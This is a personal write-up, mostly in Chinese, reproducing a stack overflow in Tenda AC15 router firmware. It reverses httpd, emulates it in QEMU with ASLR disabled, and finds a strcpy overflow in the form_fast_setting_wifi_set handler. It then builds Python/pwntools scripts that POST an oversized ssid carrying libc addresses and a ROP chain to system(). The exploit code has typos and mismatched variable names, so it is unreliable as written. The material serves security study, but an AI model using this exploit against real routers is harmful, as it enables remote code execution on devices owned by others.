# AC15_漏洞复现(CN)/English version at the bottom

1、使用 binwalk -Me  提取完固件后 进入该目录下
2、首先去 etc_ro/init.d/rCS 去看下都启动项做了什么   例：如下

~~~shell
#! /bin/sh

PATH=/sbin:/bin:/usr/sbin:/usr/bin/
export PATH

mount -t ramfs none /var/


mkdir -p /var/etc
mkdir -p /var/media
mkdir -p /var/webroot
mkdir -p /var/etc/iproute
mkdir -p /var/run
cp -rf /etc_ro/* /etc/
cp -rf /webroot_ro/* /webroot/
mkdir -p /var/etc/upan
mount -a

mount -t ramfs /dev
mkdir /dev/pts
mount -t devpts devpts /dev/pts
mount -t tmpfs none /var/etc/upan -o size=2M
mdev -s
mkdir /var/run
#mount -t jffs2 /dev/mtdblock7 /cfg

echo '/sbin/mdev' > /proc/sys/kernel/hotplug
#echo 'sd[a-z][0-9] 0:0 0660 @/usr/sbin/autoUsb.sh $MDEV' >> /etc/mdev.conf
#echo 'sd[a-z] 0:0 0660 $/usr/sbin/DelUsb.sh $MDEV' >> /etc/mdev.conf
#echo 'lp[0-9] 0:0 0660 */usr/sbin/IppPrint.sh'>> /etc/mdev.conf
#wds rule start
echo 'wds*.* 0:0 0660 */etc/wds.sh $ACTION $INTERFACE' > /etc/mdev.conf
#wsd rule end
echo 'sd[a-z][0-9] 0:0 0660 @/usr/sbin/usb_up.sh $MDEV $DEVPATH' >> /etc/mdev.conf
echo '-sd[a-z] 0:0 0660 $/usr/sbin/usb_down.sh $MDEV $DEVPATH'>> /etc/mdev.conf
echo 'sd[a-z] 0:0 0660 @/usr/sbin/usb_up.sh $MDEV $DEVPATH'>> /etc/mdev.conf
echo '.* 0:0 0660 */usr/sbin/IppPrint.sh $ACTION $INTERFACE'>> /etc/mdev.conf
#echo '115.159.183.96 cloud.tenda.com.cn' >> /etc/hosts
mkdir -p /var/ppp
insmod /lib/modules/fastnat.ko 
insmod /lib/modules/bm.ko
#insmod /lib/modules/ai.ko 
insmod /lib/modules/mac_filter.ko 
#insmod /lib/modules/ip_mac_bind.ko
insmod /lib/modules/privilege_ip.ko
insmod /lib/modules/qos.ko
insmod /lib/modules/url_filter.ko
insmod /lib/modules/loadbalance.ko
echo "0 0 0 0">/proc/sys/kernel/printk
#insmod /lib/modules/app_filter.ko
#insmod /lib/modules/port_filter.ko
#insmod /lib/modules/arp_fence.ko
#insmod /lib/modules/ddos_ip_fence.ko
insmod /lib/modules/jnl.ko
insmod /lib/modules/ufsd.ko
insmod /lib/modules/fastnat_configure.ko
chmod +x /etc/mdev.conf

cfmd &   #  注意这个 带&这个符号的意思是在后台运行的  所以说可以判断是一个服务 
echo '' > /proc/sys/kernel/hotplug
udevd &  #  这个
logserver &   #  这个  

tendaupload &
if [ -e /etc/nginx/conf/nginx_init.sh ]; then
        sh /etc/nginx/conf/nginx_init.sh
fi

moniter &
telnetd &
~~~

3、因为看到了cfmd这个服务，所以要去找和这个服务相关的二进制文件`fmd是厂家自取名的服务）`

~~~apl
grep -lr cfmd  #  查找所有和 cfmd 相关联的二进制文件 得到回显
#  httpd 
#  upgrade
#  cfmd
#  grep -lr 是 grep 命令中一个非常常用的组合，尤其在你想快速定位包含特定文本的文件，而不需要看到匹配的内容本身时非常高效。
~~~

4、因为知道固件是路由器所以去验证一下`httpd`服务是否包含cfmd服务

~~~apl
grep -lr httpd  #  看回显会发现也是有关联的
~~~

5、这时候需要去确定cfmd的位置

~~~apl
find / -name cfmd 2>/dev/null  #  会发现 是在 bin 目录下 
~~~

6、这个时候就可以cfmd放入`IDA`进行逆向静态分析

~~~apl
1. 丢入 IDA 后会惊奇的发现 之前常见的程序入口 mian 并不存在 这时候可以判断出 main 是被程序被剥离（Stripped）可以理解为反逆向的做法
2. 先检查 func 都有什么的时候 可以看到 _start 也就是程序开始的地方 可以看到 sub_A078 然后我们接着推理
3. 因为我们已知cfmd 和 httpd 是互相关联的 所以说 我们要在 IDA 中 shift + F12 去搜索 httpd 会发现 _start_httpd 的函数 双击进入会发现 sub_D528 双击进入
4. 在 sub_D528 中 选取 sub_D528 按 x(交叉引用，可以发现是谁调用的这个函数) 会看到跳转sub_D528 的上一个函数是 sub_DDEC
5. 还是同上相同的操作 继续寻找后 会发现 DDEC进行了计算 双击后会找到 DEC4
6. 同上会找到 A078 通过上面 _start 可以知道 A078 就到头了 所以整个程序的执行是
7. _start --> sub_A078 --> sub_DEC4 --> sub_DEC4-0x1c140 --> sub_DDEC --> sub_D528
~~~

7、第二种方法是正向的推理  也就是说可以在 `_start`函数的伪代码正向往下去走逻辑推理也即可 

8、先要把提取出的固件运行起来

~~~apl
 apt install qume-user-static #  因为要在本地跑，所以说，需要安装这个静态库 (user 模式)
 cp $(which qemu-arm-static)  #  需要把 qemu-arm-static 的动态库拷贝过来
~~~

9、安装好了以后

~~~apl
sudo chroot . ./qemu-arm-static  bin/httpd  #  chroot 执行文件
# 会发现回显  WeLoveLinux
~~~

简单来说，`chroot` 会让程序认为文件系统中的一个指定目录就是它的**根目录** (`/`)。一旦程序进入了这个被改变的

根环境（通常被称为 "chroot 监狱" 或 "chroot jail"），它就无法访问该目录结构以外的文件和命令。

​	9.1. **核心概念：改变根目录**

​	当你运行 `chroot /path/to/new/root command` 时，系统会做两件事：

- **隔离环境：** 将当前进程及其所有子进程的根目录 (`/`) 从系统的真实根目录 (`/`) 切换到你指定的 `/path/to/new/root` 目录。
- **启动命令：** 在这个新的根目录环境内执行你指定的 `command`。

10、现在可以把`httpd`二进制文件丢入IDA进行分析

~~~apl
shift + F12(查找字符串)  cmd + F  # 尝试去搜索 WeLoveLinux 会找到函数 sub_2E420
# IDA 静态分析找到 程序无法执行下去的原因是什么 这里发现了一个死循环  这里就要想办法去让程序如何执行下去(也就是说跳转的时候不做判断即可)
#  先在 MOV 处打好断点(F2)
~~~

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-1.png)

### 这里可以使用keypath插件来进行跳转修改的操作

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-2.png)

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-3.png)

11、修改BGT伪为B就可以实现该操作了

12、修改完该文件后保存下载 也就意味着我们现在的`httpd`这个二进制文件的逻辑已经被修改，这个时候我们需要上传我们修改的二进制文件到虚拟机环境，继续执行一下这个文件，发现监听的ip地址明显不对，这时候需要回IDA静态分析伪C看下为什么是这个情况

~~~apl
httpd listen ip = 255.255.255.255 port = 80
webs: Listening for HTTP requests at address 68.13.128.64
~~~

13、通过定位`listen ip`找到了`inet_ntoa`函数

## 1️⃣ 定义

`inet_ntoa` 是 Python 和 C 网络编程中常用的函数，用于 **将网络字节序（big-endian）的 IPv4 地址转换为点分十进制字符串**。

- **函数原型（C）**：

```c
char *inet_ntoa(struct in_addr in);
```

- **Python（socket 模块）**：

```py
import socket
socket.inet_ntoa(packed_ip)
```

------

## 2️⃣ 输入参数

- **C语言**：
  - `struct in_addr in`：存放 IP 地址的结构体，通常是 32 位整数（network byte order）。
- **Python**：
  - `packed_ip`：长度为 4 的 bytes 对象，表示 IPv4 地址，每个字节对应 IP 地址的一个段。
  - 注意：`packed_ip` 必须是 **network byte order**（网络字节序，big-endian）。

------

## 3️⃣ 返回值

- ==返回 **点分十进制字符串**，例如：==

```
b'\x7f\x00\x00\x01' → '127.0.0.1'
```

------

## 4️⃣ 使用场景

- 在解析原始套接字抓包数据时，将抓到的 IP（通常是二进制）转为人类可读形式。
- 网络协议开发或 CTF、漏洞利用中，需要处理二进制 IP。

------

## 5️⃣ Python 示例

```py
import socket
import struct

# 二进制 IP
packed_ip = b'\xC0\xA8\x01\x01'  # 对应 192.168.1.1

# 转换为点分十进制
ip_str = socket.inet_ntoa(packed_ip)
print(ip_str)  # 输出: 192.168.1.1

# 从整数构建 packed IP
ip_int = 0xC0A80101
packed_ip2 = struct.pack('!I', ip_int)
print(socket.inet_ntoa(packed_ip2))  # 输出: 192.168.1.1
```

- `struct.pack('!I', ip_int)`：
  - `!` 表示 network byte order（big-endian）
  - `I` 表示 4 字节无符号整数

------

## 6️⃣ C语言示例

```c
#include <stdio.h>
#include <arpa/inet.h>

int main() {
    struct in_addr ip;
    ip.s_addr = htonl(0xC0A80101); // 192.168.1.1 转为网络字节序
    printf("IP: %s\n", inet_ntoa(ip)); // 输出: 192.168.1.1
    return 0;
}
```

- `htonl`：将主机字节序转为网络字节序

------

## 7️⃣ 注意事项

1. **inet_ntoa 只支持 IPv4**，IPv6 需使用 `inet_ntop`。
2. 在 C 语言中，`inet_ntoa` 返回的是 **静态缓冲区**，多次调用会被覆盖，需自行拷贝。
3. Python 的 `socket.inet_ntoa` 更安全，直接返回字符串。

------

✅ 总结：

- 功能：二进制 IPv4 → 点分十进制字符串
- Python 使用 `socket.inet_ntoa(packed_ip)`
- 输入：4字节网络字节序
- 输出：可读字符串 `"192.168.0.1"`

13、在分析伪c代码的时候可以看到

~~~apl
v8 = inet_ntoa(*(struct in_addr *)&s.sa_data[2]);  #  程序使用了inet_ntoa（）方法处理了s.sa_data[2]这个值
*(_DWORD *)&s.sa_data[2] = inet_addr(a1);  # 在上面的代码可以看到 a1 就是这个值
#  接下来我们就是要开始去找这个 a1 怎么传进来的 使用x sub_1B84C交叉引用 可以看到有三个是跳转过来的  这个时候我们需要进入每一跳转的点进行查看 最后可以在第三个 BL 中找到 
dword_101A7C = sub_1B84C(v8, a1, (int)websAccept, 0);  # 是v8
# 继续分析这个函数  可以看到在上方 有个  v8 = g_lan_ip;
# 继续使用交叉引用去寻找 g_lan_ip
# Down	o	sub_2E420+2C0	LDR             R2, [R4,R2]; g_lan_ip  进入这个后观察会发现
LanIfName = getLanIfName();
  if ( getIfIp(LanIfName, v21) < 0 )
  {
    GetValue("lan.ip", s);
    strcpy(g_lan_ip, s);
~~~

14、这里我们发现了`getIfIp`,`getLanIfName`双击进入后发现是一个库函数getIfIp()

~~~apl
# 所有我们需要去看下getIfIp的功能
readelf -d httpd. # 查询动态链接库的情况 发现动态链接库 lib......
cd ../lib/  #. 进入目录 
grep -ir "getIfIp" / "getLanIfName"  #  查找哪个库里面包含了这两个函数
#  得到回显  libtpi.so 和 libcommon.so 把这两个.so 文件丢入 IDA 查看这两个函数的意义
~~~

15、在 libcommon.so中找到了两个函数

~~~C
//  getIfIp
int __fastcall getIfIp(const char *a1, char *a2)
{
  char *v3; // r0
  char dest[20]; // [sp+Ch] [bp-28h] BYREF
  struct in_addr v8; // [sp+20h] [bp-14h]
  int fd; // [sp+2Ch] [bp-8h]

  fd = socket(2, 2, 0);
  if ( fd < 0 )
    return -1;
  strncpy(dest, a1, 0x10u);
  if ( ioctl(fd, 0x8915u, dest) >= 0 )
  {
    v3 = inet_ntoa(v8);
    strcpy(a2, v3);
    close(fd);
    return 0;
  }
  else
  {
    close(fd);
    return -1;
  }
}
//. getLanIfName
int getLanIfName()
{
  return get_eth_name(0);  //重复上述操作去寻找这个
}
//  get_eth_name
const char *__fastcall get_eth_name(int a1)
{
  const char *v1; // r3

  switch ( a1 )
  {
    case 0:
      v1 = "br0";
      break;
    case 1:
      v1 = "br1";
      break;
    case 6:
      v1 = "vlan1";
      break;
    case 10:
      v1 = "vlan2";
      break;
    case 11:
      v1 = "vlan3";
      break;
    case 12:
      v1 = "vlan4";
      break;
    case 13:
      v1 = "vlan5";
      break;
    case 23:
      v1 = "eth1";
      break;
    case 24:
      v1 = "wl0.1";
      break;
    case 27:
      v1 = "eth2";
      break;
    case 28:
      v1 = "wl1.1";
      break;
    case 51:
      v1 = "br10";
      break;
    case 55:
      v1 = "br20";
      break;
    default:
      v1 = (const char *)&unk_66C8;
      break;
  }
  return v1;
}
~~~

# 逐行解释（控制流 & 功能）

下面以 `getIfIp(const char *a1, char *a2)` 为主线逐步说明：

1. `fd = socket(2, 2, 0);`

   - 创建一个 socket。数值 `2,2,0` 对应常见宏：
     - `AF_INET` == 2（地址族 IPv4）
     - `SOCK_DGRAM` == 2（UDP / datagram socket）
   - 返回的 `fd` 是文件描述符，用于后续 `ioctl`。如果失败返回 `< 0`。

2. `if ( fd < 0 ) return -1;`

   - socket 创建失败直接返回 -1（失败）。

3. `strncpy(dest, a1, 0x10u);`

   - 把传入的接口名 `a1` 拷贝到局部 `dest`（20 字节缓冲区），最多拷贝 16 (`0x10`) 字节。
   - 这是伪码；实际正确的 ioctl 要求把 `struct ifreq` 传给 `ioctl`，而不是纯字符串。反汇编代码可能是把 `dest` 作为 `ifreq` 结构的起始处（即 `dest` 实际上指向一个 `struct ifreq` 的缓冲区），或者后面代码在内存上继续写入 addr 字段 —— 伪码把这简化了。

4. `if ( ioctl(fd, 0x8915u, dest) >= 0 )`

   - `0x8915` 十六进制很典型：这是 Linux 下的 `SIOCGIFADDR`（获取接口地址）的 ioctl 命令码（实际宏为 `SIOCGIFADDR`）。
   - `ioctl(fd, SIOCGIFADDR, struct ifreq *ifr)` 通常要求第三个参数是指向 `struct ifreq` 的指针，内含接口名和一个 `sockaddr` 用于返回地址。
   - 这里伪码把 `dest` 做为第三参（说明 `dest` 是 `struct ifreq` 的起始地址或映射到了该结构）。
   - 如果 ioctl 返回 >= 0 表示成功，内核已经在 `dest` 指向的缓冲区写入了地址信息。

5. `v3 = inet_ntoa(v8);`

   - `inet_ntoa` 将 `struct in_addr` （网络字节序的 IPv4）转换为字符串，比如 `192.168.1.1`。

   - 在伪码中 `v8` 并没有显式被赋值。但在真实 C 实现中，`v8` 应该来自 `ifreq.ifr_addr` 的 `sin_addr` 字段。例如：

     ```
     struct ifreq ifr;
     strncpy(ifr.ifr_name, a1, IFNAMSIZ);
     ioctl(fd, SIOCGIFADDR, &ifr);
     struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
     strcpy(a2, inet_ntoa(sin->sin_addr));
     ```

   - 因此 `v8` 在伪码里是代表 `ifr.ifr_addr` 的地址值（反汇编器可能把它单独命名为 v8）。

6. `strcpy(a2, v3);`

   - 把 `inet_ntoa` 返回的字符串拷贝到用户传入的输出缓冲 `a2`。
   - `strcpy` 不做长度检查——若 `a2` 缓冲区不足会导致缓冲区溢出（堆栈溢出或覆盖堆内存，取决于 a2 指向的内存）。

7. `close(fd); return 0;`

   - 关闭 socket，返回 0 表示成功。

8. `else { close(fd); return -1; }`

   - ioctl 失败的分支：关闭 socket 并返回 -1。

------

`getLanIfName()`：

- 返回 `get_eth_name(0)`，也就是 `get_eth_name` 的 case 0 分支，即 `"br0"`（bridge interface）——表示默认 LAN 接口名为 `"br0"`。

`get_eth_name(int a1)`：

- 依据输入整数返回对应接口名字符串（硬编码映射）。
- default 分支返回 `(const char *)&unk_66C8`（未识别时返回某个全局/未知字符串地址）。

------

# 真实实现所需的数据结构（关键点）

在真实 C 代码中，`ioctl(fd, SIOCGIFADDR, &ifr)` 的用法是：

```
struct ifreq ifr;
memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
if (ioctl(fd, SIOCGIFADDR, &ifr) == 0) {
    struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
    const char *ip = inet_ntoa(sin->sin_addr);
    strcpy(out_buf, ip);
}
```

注意 `ifr` 的结构在不同平台稍有差异，但基本包含接口名 `ifr_name` 和 `ifr_addr`（即返回的 `sockaddr`）。

伪码中 `dest` 很可能等价于 `struct ifreq ifr` 的起始地址，`v8` 等价于 `sin->sin_addr`。反编译器有时会把这些 overlay 的内存区域拆成不同变量名（如 dest 与 v8）。

------

# 潜在的安全问题与风险（详细列举）

1. **`strcpy(a2, v3)`：未检查 a2 大小 — 明显的缓冲区溢出风险**
   - `inet_ntoa` 返回的字符串一般长度 <= 16 字节（"255.255.255.255" 为 15 字符 + NULL），但如果调用者传给 `a2` 的缓冲区小于 16 字节就会溢出。
   - 如果 `a2` 是栈上小缓冲区，会引起堆栈溢出并可能被利用为 RCE（取决于可利用性/ASLR/DEP/编译器保护等）。在嵌入式固件中常见 `a2` 是固定小缓冲区（例如 web 请求处理），风险很高。
2. **`strncpy(dest, a1, 0x10u)`：可能没有显式 null 结尾**
   - `strncpy` 在复制满长度时不会自动追加 `\0`。如果 `a1` 长度 >= 16，则 `dest` 可能不是以 `\0` 结尾。后续 `ioctl` 使用该结构时可能需要 null 结尾的接口名 (`ifr.ifr_name`)；这种缺失可能导致不可预期行为（但 `ifr_name` 是固定长度字段，内核使用长度常量 IFNAMSIZ — 更安全是 `strncpy(ifr.ifr_name, name, IFNAMSIZ-1); ifr.ifr_name[IFNAMSIZ-1]=0;`）。
   - 反过来，若 `dest` 真的是 `struct ifreq` 占据的内存，这个 strncpy 可能只写了 `ifr_name` 的一部分，剩下的内存未初始化。
3. **`inet_ntoa` 的非线程安全性**
   - `inet_ntoa` 返回指向静态缓冲区的指针（在 libc 实现中），每次调用会覆盖该静态缓冲区。多线程或多次连续调用会产生竞态/覆盖问题。
   - 建议使用 `inet_ntop`（需要传入目标缓冲区），或在 Python/C 端立刻 `strdup`/`strcpy` 到独占缓冲区。
4. **`ioctl` 参数类型/内存布局不明确（反编译伪码问题）**
   - 伪码把 `dest` 当作第三参数传入 ioctl。实际必须是 `struct ifreq *`。若代码没有正确构建 `struct ifreq`，ioctl 会失败或返回未定义数据。
   - 反编译器未展示 `dest` 的完整用法，真实代码可能在 `dest+16` 之类地方写入 sockaddr，伪码隐藏了这些写操作。
5. **没有对 `inet_ntoa` 返回值是否为 NULL 的检查**
   - 虽然一般不会为 NULL，但严谨代码会检查返回值。
6. **资源管理**
   - socket 在所有分支都有 `close(fd)`，这是对的，但要确保所有失败路径都执行了 close（伪码显示是正确的）。
7. **`get_eth_name` 默认分支可能返回未初始化或不可读内存指针**
   - `v1 = (const char *)&unk_66C8`，若 `unk_66C8` 未定义或不是合法的 C 字符串，使用者读取时会内存错误或输出乱码。
8. **攻击面**
   - 如果上层（比如 web CGI）允许远程提供 `a1`（接口名）或 `a2` 指向可控内存，则可能被远程触发溢出或信息泄露。
   - 如果 attacker 可以控制 `a2` 指向文件/内存映射，可造成写入敏感区域。

------

# 可能的利用向量（攻击场景）

- **本地提权 / RCE（条件苛刻）**：
  - 如果 `a2` 指向栈上小缓冲区（例如函数内局部 buf[8]）并且该函数权限较高（例如 web 服务进程运行 root），`strcpy(a2, v3)` 可覆盖返回地址或函数指针，从而被攻击利用。利用难度取决于可写内存布局、保护机制（NX/ASLR/stack canaries）。
- **信息泄露**：
  - 未初始化数据或 `ifr` 未正确填充可能让函数返回内核或内存残留的敏感数据。
- **DoS**：
  - 提供非法 `a1` 导致 ioctl 持续阻塞或返回异常值，触发错误路径或资源耗尽。

------

# 总结（重点回顾）

- `getIfIp` 的本意：基于接口名调用 `SIOCGIFADDR` 获取该接口 IPv4 地址并把字符串形式写入 `a2`，返回 0 表示成功，-1 表示失败。
- 现实问题与风险：
  - 伪码中的直接 `strcpy(a2, ...)` 会引入缓冲区溢出风险；`strncpy` 也可能丢失终止符。
  - `inet_ntoa` 是静态缓冲区的，不线程安全；应换 `inet_ntop`。
  - `ioctl` 第三参应为 `struct ifreq*`，实际代码需正确构造 `struct ifreq`。
  - `get_eth_name` 的 default 返回不明地址，应修正为 `NULL` 或明确的 constant。

------

16、由上述代码可以得知 get_eth_name 是带 0 进入的，所以 ip地址是在 br0 网卡 获取到的 ip 地址

~~~apl
cp -a webroot_ro/* ./webroot  #. 把webroot_ro中的文件拷贝到webroot的下面
sudo brctl addbr br0  #  这个命令是在你的 Linux 系统内核中创建了一个名为 br0 的 虚拟网络交换机（即网桥）。这个网桥本身是一个二层设备，用于连接多个物理或虚拟网卡，使它们看起来像位于同一个局域网（LAN）内。 
sudo ifconfig br0 192.168.0.1  # 设置网关
sudo chroot . ./qemu-arm-static ./bin/httpd  #  模拟开启服务 并使用浏览器去访问 192.168.0.1
~~~

17、接下来就是要使用`qemu-system-arm`去模拟运行这个路由器的系统,首先创建脚本

~~~bash
#!/bin/sh
qemu-system-arm -M vexpress-a9 -kernel /home/iot/tools/qemu-images/armhf/vmlinuz-3.2.0-4-vexpress -initrd /home/iot/tools/qemu-images/armhf/initrd.img-3.2.0-4-vexpress -drive if=sd,file=/home/iot/tools/qemu-images/armhf/debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2 console=ttyAMA0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
~~~

18、创建完启动脚本后,先赋最高权限，然后开始配置网络

~~~apl
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.3.1/24 up  # 如果想配置 nat 网络和有防火墙的话 加入下面配置命令
-------------------------------------------------------------------------------
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null # 配置NAT（假设物理机外网接口是ens33）
sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
sudo iptables -A FORWARD -i tap0 -j ACCEPT
sudo iptables -A FORWARD -o tap0 -j ACCEPT
~~~

19、网络配置完毕后

~~~apl
chmod 777 start.sh 
./start.sh  #  运行脚本  这是会看到新的终端 等待片刻 输入 root root 进入即可 
~~~

20、进入后先关闭地址随机化

~~~apl
sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space" 
#  0： 完全关闭 ASLR。
#  1： 部分随机化（栈、VDSO、共享内存的随机化，堆和 mmap 区域不随机化）。
#  2： 完全随机化（默认设置，推荐）。
cat /proc/sys/kernel/randomize_va_space  #  回显 0就是关闭成功
~~~

21、开始配置网络配置

~~~apl
ip link add br0 type dummy  #  这个命令是在操作系统内核中创建了一个虚拟网络接口
ifconfig eth0 192.168.3.2/24 # 这个命令配置了你的物理网卡。
ifconfig br0 192.168.3.3/24 # 这个命令配置了你刚才创建的虚拟网卡。
~~~

22、配置好了以后就可以使用`tar`去把`squashfs-root`压缩后，使用Python开启http服务上传到qemu模拟的系统上这里顺便把gdbserver也上传到我们的qemu模拟机器上

~~~apl
tar -cvf ss.tar.gz squashfs-root/ #  压缩文件夹 
python3 -m http.server 8000 # Python 开启 http 服务
wget http://192.168.3.1:8000/ss.tar.gz  #  下载这个压缩包 
tar -xvf ss.tar.gz   # 解压
wget http://192.168.3.1:8000/gdbserver-7-7-1-armhf-eabi5-v1-sysv # 上传gdb服务器
~~~

​	22.1、如果启动的时候发现qemu模拟的系统ip会重置为空的话 可以尝试一下操作

~~~apl
sudo pkill dhclient  #  关闭 dhcp 服务
~~~

​	22.2. 不用 dummy bridge，直接用 eth0

编辑 guest 的 `/etc/network/interfaces`：

```apl
auto eth0
iface eth0 inet static
    address 192.168.3.2
    netmask 255.255.255.0
    gateway 192.168.3.1
    dns-nameservers 8.8.8.8 114.114.114.114
```

23、在`qemu`模拟中启动httpd服务

~~~apl
chroot . sh  #  在当前目录 (.) 作为新的根目录 (/) 来启动一个 Shell 会话
cd bin/   httpd   #  进入 bin 目录下  启动 httpd 服务后去浏览器中打开ip 成功即可
~~~

24、进入`web`页面后，尝试寻找疑似溢出点

~~~apl
web页面可以看到左侧有菜单栏，我们可以开始分析，第一个是网络状态看着就不是很像 过
第二个是外网设置，虽然说有输出点，但是能输入的选项是：首选和备选的DNS服务器 感觉这里大概率会被限制，因为DNS都是有规则的 所以这个 也过
第三个进去后发现第一个是无线名和密码 感觉可以尝试这里
点进去后发现有 2.4G网络和 5G网络 尝试输入非正常的输入后还可以正常保存
这时我们重新进入这个页面打开开发者模式 重新输入上传观察会发现。数据是post个后台一个goform的文件夹下的文件去处理的
打开IDA搜索 goform 会找到 su_2E9EC这个 双击进入转为伪c会发现sub_179A8在处理后会重新赋给v4 然后在sub_42378去处理 v4 所以我们进入sub_42378这里我们可以看到很多表单 但是我们可以找到一个类似的表单叫form_fast_setting_wifi_set 字面意思来看就是我们要的(后来去 webroot下查看 index.js也确实证实了这一点) 双击进去 转伪c 我们看到了危险函数 strcpy 但是有两个
切到 IDA-view—A ctrl+k 查看栈分布可以得知以下图片
~~~

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-7.png)

25、最终我们选择使用第一个`strcpy`进行，由上图可知，一、s 是距离 LR 最近的。二、如果选择 dest 的话可能会覆盖到 s。所以为了保险起见我们选择使用第一个

26、在构造的之前我们需要找到栈地址也就是寄地址第一次的 strcpy 如果要溢出到返回地址，会覆盖第二次的strcpy 的参数 *src（不能把这个覆盖了，第二个 strcpy 还需要用），指向的内存会导致抛异常，程序不会指向目标调转地址处，所以要将 src 指针覆盖为有效地址，并且不影响第一次的strcpy，由于 strcpy 在遇到 x00 时会截断，所以 two_addr（前面提到的为了让第二个strcpy不异常）需要在 libc 库里面找。这个库加载的顺序比较靠前，程序基址会比较大，从而可读字符串的地址也会比较大，这样覆盖的 payload 就不会因为地址里面有“00”而被截断。所以我们现在需要使用动态调试去链接上程序找到这个 libc 的基地址

27、开启http程序后

~~~apl
ps aux | grep httpd. # 找到httpd 的进程
./gdbserver :1233 --attach httpd 进程号  #  开启gdb服务
pwndbg ./httpd  #  在 宿主机中链接
vmmap  # 查看基地址 由于上面描述可以得知 我们要找的是 libc 中靠前的  那就是 0x76dab000
~~~



![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-5.png)

28、接下来就是需要我们去libc里找一个字符串来去覆盖到src中去。把`libc.0.so`丢入IDA

~~~apl
我们找到了 home  也就是 0x00064144
顺便我们找一个可以跳转的地址two_jp_addr 为 system  0x0005A270
~~~

29、接下来构造一个发包的脚本(在宿主机建立)

~~~python
import requests
from pwn import *

ji_addr=0x76dab000  # 基地址 libc 的地址
one_jg_addr=ji_addr + 0x00064144 # 为了去填充下面的src(str类型)
system_addr=0x0005A270 + ji_addr  # libc中的system函数作为跳转

payload=b'a'*(0x60)+p32(one_jp_addr)+b'b'(0x18)+p32(system_addr)
url="http://192.168.3.3/gofrom/fast_setting_wifi_set"
cookie={"Cookie":"password=qweqwe"}
data={"ssid":payload}

response=requests.post(url,cookies=cookie,data=data)
response=requests.post(url,cookies=cookie,data=data)
~~~

30、gdb链接好以后运行脚本发包

~~~apl
b *0x67070、67088、6775c  #断点打在了第一个 strcpy 的前几步
C  #  运行
--------------
Python3 exp_ac15.py # 宿主机发包
--------------
n  #  宿主机接到后走单步 并观察 gdb 动调  可以看到 0x5a270 formGetSystemStatus+8580跳转成功
~~~

31、跳转成功后可以开始构造我们的`ROP`了

~~~c
// 先去 IDA 中查看 libc 中的 system 的函数
int __fastcall system(int a1) // 可以看到只有一个参传进来
{
............
}
~~~

32、这时我们可以猜想汇编应该是这个样子的

~~~apl
mv r0 , sp ; blx 
~~~

33、我们使用ropgadget去尝试查找

~~~apl
ROPgadget --binary ../../gujian/squashfs-root/1ib/1ibc.so.0 | grep "mov r0,sp:blx"
~~~

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-8.png)

~~~apl
ROPgadget --binary ../../gujian/squashfs-root/1ib/1ibc.so.0 --only pop
~~~

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-9.png)

34、通过上述2步可以知道

~~~apl
我们的 mov_addr=0x00040cb4  pop_addr=0x00018298
~~~

35、现在我们可以构造ROP了

~~~apl
import requests
from pwn import *
target_ip="192.168.3.3"
target_port=80

ji_addr=0x76dab000  # 基地址 libc 的地址
system_addr=0x5A270 # libc中的system函数作为跳转
pop_addr=0x18298
mov_addr=0x49c64

one_jg_addr=ji_addr + 0x00064144 # 为了去填充下面的src(str类型)
two_jp_addr=ji_addr + pop_addr
three_jp_addr=ji_addr + system_addr
end_jp_addr=ji_addr + mov_addr

cmd='ps>aaaaaaaaaaaaaaaa.txt'

payload=b'a'*(0x60)+p32(one_jp_addr)+b'b'(0x18)+p32(two_jp_addr)+p32(three_addr)+p32(end_jp_addr)

url=f"http://192.168.3.3/gofrom/fast_setting_wifi_set"
cookie={"Cookie":"password=qweqwe"}
data={"ssid":payload}

response=requests.post(url,cookies=cookie,data=data)
response=requests.post(url,cookies=cookie,data=data)
~~~

36、我们的`ROP` 已经构造完成，接下启动 httpd 服务、gdbserver 服务。并链接 gdbserver

~~~apl
b *0x67070、67088、6775c  # 设置断点 宿主机启动脚本
c  #  运行到第一个断点观察
c  #  运行到第二个断点观察
c  #  运行到第三个断点观察
~~~

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-10.png)

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-11.png)

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-12.png)

37、验证

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-13.png)

------

# AC15 Vulnerability Reproduction

# AC15_Vulnerability Reproduction (English translation)

1. After extracting the firmware with `binwalk -Me`, enter the extracted directory.
2. First check what the startup items do in `etc_ro/init.d/rCS`. Example as follows:

```bash
#! /bin/sh

PATH=/sbin:/bin:/usr/sbin:/usr/bin/
export PATH

mount -t ramfs none /var/


mkdir -p /var/etc
mkdir -p /var/media
mkdir -p /var/webroot
mkdir -p /var/etc/iproute
mkdir -p /var/run
cp -rf /etc_ro/* /etc/
cp -rf /webroot_ro/* /webroot/
mkdir -p /var/etc/upan
mount -a

mount -t ramfs /dev
mkdir /dev/pts
mount -t devpts devpts /dev/pts
